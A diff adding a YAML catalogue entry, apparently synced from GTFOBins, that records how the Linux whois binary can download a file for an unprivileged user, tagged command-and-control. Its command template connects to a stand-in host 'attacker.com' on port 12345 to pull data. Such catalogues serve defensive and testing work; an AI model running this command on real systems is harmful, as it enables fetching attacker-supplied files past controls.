@@ -1,0 +1,24 @@
+id: gtfobins/whois/download/unprivileged
+type: binary
+platform: linux
+name: whois
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: whois -h attacker.com -p 12345 x
+  comment: Received data has instances of the `\r` byte stripped.
+references:
+- https://gtfobins.github.io/gtfobins/whois/
+tags:
+- linux
+- unix
+- gtfobins
